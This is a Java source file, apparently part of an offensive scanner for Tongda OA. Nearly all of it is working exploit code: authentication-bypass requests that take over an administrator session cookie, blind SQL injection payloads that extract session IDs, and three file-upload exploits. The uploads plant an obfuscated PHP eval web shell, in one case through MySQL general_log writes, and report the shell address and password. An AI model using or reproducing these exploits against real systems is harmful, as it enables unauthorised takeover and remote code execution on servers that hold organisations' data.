package com.against.oascan.poc;

import com.against.oascan.MainController;
import com.against.oascan.utils.HttpUtil;
import com.against.oascan.utils.Response;
import com.alibaba.fastjson.JSON;

import java.net.Proxy;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TongdaPoc {
    private Proxy proxy = null;
    private String url;
    private MainController mainController;
    private String shellUrl;

    public TongdaPoc(Proxy proxy, String url, MainController mainController) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        this.proxy = proxy;
        this.url = url;
        this.mainController = mainController;
    }

    public String getCookie(String poc) {
        mainController.tdAppendVulInfo("[+] 开始尝试利用任意用户登录漏洞获取cookie");
        switch (poc) {
            case "POC1":
                return userLoginPoc1();
            case "POC2":
                return userLoginPoc2();
            case "POC3":
                return userLoginPoc3();
            case "POC4":
                return userLoginPoc4();
            default:
                return null;
        }
    }

    public void fileUploadVulScan() {
        mainController.tdAppendVulInfo("[+] 正在利用通达OA文件上传漏洞中 ......");
        String cookie = null;
        String pocs[] = {"POC1", "POC2", "POC3", "POC4"};
        for (String poc : pocs) {
            cookie = getCookie(poc);
            if (cookie != null) {
                break;
            }
        }
        if (cookie == null) {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞利用失败，开始尝试SQL注入漏洞");
            mainController.tdAppendVulInfo("[+] 开始利用SQL注入漏洞1");
            cookie = sqlInjectPoc1();
            if (cookie != null) {
                mainController.tdAppendVulInfo("[+] 成功获取到cookie：" + cookie + " ，开始尝试文件上传");
                uploadCoreFun(cookie);
            } else {
                mainController.tdAppendVulInfo("[+] 开始利用SQL注入漏洞2");
                cookie = sqlInjectPoc2();
                if (cookie != null) {
                    mainController.tdAppendVulInfo("[+] 成功获取到cookie：" + cookie + " ，开始尝试文件上传");
                    uploadCoreFun(cookie);
                } else {
                    mainController.tdAppendVulInfo("[-] 无法获取cookie，漏洞利用失败");
                    return;
                }
            }

        } else {
            uploadCoreFun(cookie);
        }

    }

    public void fileContainVulScan() {
        mainController.tdAppendVulInfo("[+] 正在利用通达OA文件包含漏洞中 ......");
        String cookie;
        String pocs[] = {"POC1", "POC2", "POC3", "POC4"};
        for (String poc : pocs) {
            cookie = getCookie(poc);
        }
    }

    public void testVul() {
        fileUpload3("PHPSESSID=33tgi71gsrvldqp166erfgt3n4;");
    }

    /**
     * 任意用户登录获取cookie的方法1
     *
     * @return
     */
    public String userLoginPoc1() {
        mainController.tdAppendVulInfo("\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
        String cookie = null;
        String codeuid = null;
        List<String> heads = new ArrayList<>();

        //访问login_code.php，获取codeuid
        mainController.tdAppendVulInfo("[+] 开始尝试任意用户漏洞POC1 ......");
        Response uid = HttpUtil.doGet(url + "/ispirit/login_code.php", proxy);
        if (uid.getText().contains("codeuid") && uid.getCode() == 200) {
            codeuid = JSON.parseObject(uid.getText()).getString("codeuid");
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC1不存在");
            return null;
        }

        //访问logincheck_code.php，获取登录的cookie
        Response cookieInfo = HttpUtil.doPost(url + "/logincheck_code.php", String.format("UID=1&CODEUID=_PC%s", codeuid), proxy);
        if (cookieInfo.getCode() == 200 && cookieInfo.getText().contains("index.php")) {
            cookie = Response.dataCleaning(cookieInfo.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
            System.out.println(cookie);
            heads.add("Cookie: " + cookie + "_SERVER=");
            System.out.println(heads.get(0));
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC1不存在");
            return null;
        }

        //访问主页，开始验证cookie是否可用
        Response flag = HttpUtil.doComplexGet(url + "/general/", heads, proxy);
        if (flag.getText().contains("club.tongda2000.com")) {
            mainController.tdAppendVulInfo("[++] 成功获取用户Cookie：" + cookie);
            return cookie;
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC1不存在123123");
            return null;
        }
    }

    public String userLoginPoc2() {
        mainController.tdAppendVulInfo("\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
        String cookie = null;
        String codeuid = null;
        List<String> heads = new ArrayList<>();

        //访问login_code.php，获取codeuid
        mainController.tdAppendVulInfo("[+] 开始尝试任意用户漏洞POC2 ......");
        Response uid = HttpUtil.doGet(url + "/ispirit/login_code.php", proxy);
        if (uid.getText().contains("codeuid") && uid.getCode() == 200) {
            codeuid = JSON.parseObject(uid.getText()).getString("codeuid");
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC2不存在");
            return null;
        }

        //访问logincheck_code.php，获取登录的cookie
        HttpUtil.doPost(url + "/general/login_code_scan.php", String.format("uid=1&source=pc&type=confirm&codeuid=%s", codeuid), proxy);
        Response cookieInfo = HttpUtil.doGet(url + "/ispirit/login_code_check.php?codeuid=" + codeuid, proxy);
        if (cookieInfo.getCode() == 200) {
            cookie = Response.dataCleaning(cookieInfo.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
            System.out.println(cookie);
            heads.add("Cookie: " + cookie);
            System.out.println(heads.get(0));
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC2不存在");
            return null;
        }

        //访问主页，开始验证cookie是否可用
        Response flag = HttpUtil.doComplexGet(url + "/general/", heads, proxy);
        if (flag.getText().contains("club.tongda2000.com")) {
            mainController.tdAppendVulInfo("[++] 成功获取用户Cookie：" + cookie);
            return cookie;
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC2不存在");
            return null;
        }
    }

    public String userLoginPoc3() {
        mainController.tdAppendVulInfo("\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
        String cookie = null;
        List<String> heads = new ArrayList<>();

        mainController.tdAppendVulInfo("[+] 开始尝试任意用户漏洞POC3 ......");
        //访问logincheck_code.php，获取登录的cookie
        Response cookieInfo = HttpUtil.doPost(url + "/logincheck_code.php", "UNAME=admin&PASSWORD=&encode_type=1&UID=1", proxy);
        if (cookieInfo.getHead().contains("PHPSESSID")) {
            cookie = Response.dataCleaning(cookieInfo.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
            System.out.println(cookie);
            heads.add("Cookie: " + cookie);
            System.out.println(heads.get(0));
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC3不存在");
            return null;
        }

        //访问主页，开始验证cookie是否可用
        Response flag = HttpUtil.doComplexGet(url + "/general/", heads, proxy);
        if (flag.getText().contains("club.tongda2000.com")) {
            mainController.tdAppendVulInfo("[++] 成功获取用户Cookie：" + cookie);
            return cookie;
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC3不存在");
            return null;
        }
    }

    public String userLoginPoc4() {
        mainController.tdAppendVulInfo("\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
        String cookie = null;
        String codeuid = null;
        List<String> heads = new ArrayList<>();

        //访问login_code.php，获取codeuid
        mainController.tdAppendVulInfo("[+] 开始尝试任意用户漏洞POC4 ......");
        Response uid = HttpUtil.doGet(url + "/general/login_code.php", proxy);
        if (uid.getText().contains("codeuid") && uid.getCode() == 200) {
            codeuid = JSON.parseObject(uid.getText().substring(uid.getText().length() - 67).trim()).getString("codeuid");
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC4不存在");
            return null;
        }

        //访问logincheck_code.php，获取登录的cookie
        Response cookieInfo = HttpUtil.doPost(url + "/logincheck_code.php", String.format("UID=1&CODEUID=%s", codeuid), proxy);
        if (cookieInfo.getCode() == 200 && cookieInfo.getText().contains("index.php")) {
            cookie = Response.dataCleaning(cookieInfo.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
            System.out.println(cookie);
            heads.add("Cookie: " + cookie);
            System.out.println(heads.get(0));
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC4不存在");
            return null;
        }

        //访问主页，开始验证cookie是否可用
        Response flag = HttpUtil.doComplexGet(url + "/general/", heads, proxy);
        if (flag.getText().contains("club.tongda2000.com")) {
            mainController.tdAppendVulInfo("[++] 成功获取用户Cookie：" + cookie);
            return cookie;
        } else {
            mainController.tdAppendVulInfo("[-] 任意用户登录漏洞POC4不存在");
            return null;
        }
    }

    /**
     * SQL注入获取cookie的方法
     *
     * @return
     */
    public String sqlInjectPoc1() {
        String params = "_SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(ascii(substr((select+SID+from+user_online+limit+1),%d,1))<<%d>>63=0,1,exp(710))#";
        String cookie = sqlInjectCoreFunction(url + "/general/document/index.php/setting/keywords/index", params);
        if (cookie != null) {
            cookie = "PHPSESSID=" + cookie + ";";
            System.out.println(cookie);
        }
        return cookie;
    }

    public String sqlInjectPoc2() {
        String params = "title)values(\"'\"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),%d,1))<<%d>>63keng0),1,710)))#=1&_SERVER=";
        String cookie = sqlInjectCoreFunction(url + "/general/document/index.php/recv/register/insert", params);
        if (cookie != null) {
            cookie = "PHPSESSID=" + cookie + ";";
            System.out.println(cookie);
        }
        return cookie;
    }

    public String sqlInjectCoreFunction(String url, String params) {
        String result = "";
        for (int len = 1; len <= 26; len++) {
            String str = "0";
            for (int bit = 57; bit <= 63; bit++) {
                String payload = String.format(params, len, bit);
                payload = payload.replace("keng", "%3d");
                Response response = HttpUtil.doPost(url, payload, proxy);
                //200为poc1的判断条件,302为poc2的判断条件
                if (response.getCode() == 200 || response.getCode() == 302) {
                    str += "0";
                } else {
                    str += "1";
                }
            }
            int ascii = Integer.parseInt(str, 2);
            result += (char) ascii;
            System.out.println(result);
            if (ascii == 0 || ascii == 127) {
                System.out.println("SESSION获取失败,该系统当前无已登录成功的账户...");
                result = null;
                break;
            }
        }
        return result;
    }

    /**
     * 文件上传调用方法
     *
     * @param cookie
     * @return
     */
    public Boolean uploadCoreFun(String cookie) {
        for (int i = 1; i <= 3; i++) {
            switch (i) {
                case 1:
                    if (fileUpload1(cookie)) {
                        return true;
                    } else {
                        break;
                    }
                case 2:
                    if (fileUpload2(cookie)) {
                        return true;
                    } else {
                        break;
                    }
                case 3:
                    if (fileUpload3(cookie)) {
                        return true;
                    } else {
                        break;
                    }
            }
        }
        return false;
    }

    public Boolean fileUpload1(String cookie) {
        mainController.tdAppendVulInfo("[+] 开始利用 POC1 进行文件上传");
        String shellUrl = "";
        String shellName = getFileName();
        String payload = "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";
        List<String> cookieInfo = new ArrayList<>();
        cookieInfo.add("Cookie: " + cookie + "_SERVER=");

        //创建StringBuilder对象
        StringBuilder tempParams = new StringBuilder();
        //tempParams.append("------WebKitFormBoundaryBE2AUcdQ1Hp3HWDu");
        tempParams.append("Content-Disposition: form-data; name=\"FILE1\"; filename=\"" + shellName + ".php\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php $a=\"~+d()\"^\"!{+{}\";$b=${$a}[\"x\"];eval(\"\".$b);echo \"" + shellName + "\"?>");
        tempParams.append("\r\n");
        tempParams.append("------WebKitFormBoundaryBE2AUcdQ1Hp3HWDu--");
        tempParams.append("\r\n");

        HttpUtil.uploadFile(url + payload, tempParams, cookieInfo, proxy);

        Response result = HttpUtil.doGet(url + "/_" + shellName + ".php", proxy);
        if (result.getText().contains(shellName)) {
            mainController.tdAppendVulInfo("[+++] 文件上传成功，shell地址：" + url + "/_" + shellName + ".php\n" + "          密码：m   建议使用蚁剑连接");
            return true;
        } else {
            return false;
        }
    }

    public Boolean fileUpload2(String cookie) {
        mainController.tdAppendVulInfo("[+] 开始利用 POC2 进行文件上传");
        String shellUrl = "";
        String shellName = getFileName();
        String payload = "/general/system/database/sql.php";
        List<String> cookieInfo = new ArrayList<>();
        cookieInfo.add("Cookie: " + cookie + "_SERVER=");

        Response rootPath = HttpUtil.doComplexGet(url + "/general/system/security/service.php", cookieInfo, proxy);
        String webRootPath = Response.dataCleaning2(rootPath.getText(), Pattern.compile("name=\"WEBROOT\".+?value=\"(.+?)\"")).replace("\\", "/");
        String log_directory = webRootPath.replace("webroot", "data5");

        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"sql_file\"; filename=\"" + shellName + ".sql\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("set global general_log='on';SET global general_log_file='" + webRootPath + "/helloWorld.php';SELECT '<?php file_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"//" + shellName + ".php\",base64_decode(\"PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJ4Il07ZXZhbCgiIi4kYik7Pz4=\").\"" + shellName + "\");?><?php unlink(__FILE__);echo \"7bau8tlj\";?>';SET global general_log_file='" + log_directory + "/WIN-TEMP.log';SET global general_log='off';");
        tempParams.append("\r\n");
        tempParams.append("------WebKitFormBoundaryBE2AUcdQ1Hp3HWDu--");
        tempParams.append("\r\n");

        HttpUtil.uploadFile(url + payload, tempParams, cookieInfo, proxy);

        Response result = HttpUtil.doGet(url + "/" + "helloWorld.php", proxy);
        if (result.getText().contains("7bau8tlj")) {
            if (HttpUtil.doGet(url + "/" + shellName + ".php", proxy).getText().contains(shellName)) {
                mainController.tdAppendVulInfo("[+++] 文件上传成功，shell地址：" + url + "/" + shellName + ".php\n" + "          密码：m   建议使用蚁剑连接");
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public Boolean fileUpload3(String cookie) {
        mainController.tdAppendVulInfo("[+] 开始利用 POC3 进行文件上传");
        String shellUrl = "";
        String shellName = getFileName();
        String payload = "/module/upload/upload.php?module=im";
        List<String> cookieInfo = new ArrayList<>();
        cookieInfo.add("Cookie: " + cookie + "_SERVER=");

        Response rootPath = HttpUtil.doComplexGet(url + "/general/system/security/service.php", cookieInfo, proxy);
        String webRootPath = Response.dataCleaning2(rootPath.getText(), Pattern.compile("name=\"WEBROOT\".+?value=\"(.+?)\"")).replace("\\", "/");

        HttpUtil.doComplexPost(url + "/general/system/attachment/position/add.php", "POS_ID=177&POS_NAME=temp&POS_PATH=" + webRootPath + "&IS_ACTIVE=on", cookieInfo, proxy);

        StringBuilder tempParams = new StringBuilder();
        tempParams.append("Content-Disposition: form-data; name=\"file\"; filename=\"" + shellName + ".php.\"");
        tempParams.append("\r\n");
        tempParams.append("\r\n");
        tempParams.append("<?php $a=\"~+d()\"^\"!{+{}\";$b=${$a}[\"x\"];eval(\"\".$b);echo \"" + shellName + "\"?>");
        tempParams.append("\r\n");
        tempParams.append("------WebKitFormBoundaryBE2AUcdQ1Hp3HWDu--");
        tempParams.append("\r\n");

        Response upInfo = HttpUtil.uploadFile(url + payload, tempParams, cookieInfo, proxy);
        Pattern pattern3 = Pattern.compile(".*?@(.*?)_(.*?),");
        Matcher matcher3 = pattern3.matcher(upInfo.getText());

        if (matcher3.find()) {
            String temp_url = url + "/im/" + matcher3.group(1) + "/" + matcher3.group(2) + "." + shellName + ".php";
            if (HttpUtil.doGet(temp_url, proxy).getText().contains(shellName)) {
                mainController.tdAppendVulInfo("[+++] 文件上传成功，shell地址：" + temp_url + "\n          密码：m   建议使用蚁剑连接");
                return true;
            } else {
                mainController.tdAppendVulInfo("[-] 文件上传漏洞利用失败");
                return false;
            }
        } else {
            mainController.tdAppendVulInfo("[-] 文件上传漏洞利用失败");
            return false;
        }
    }

    public static String getFileName() {
        UUID uuid = UUID.randomUUID();
        String str = uuid.toString();
        String uuidStr = str.replace("-", "");
        return uuidStr;
    }
}
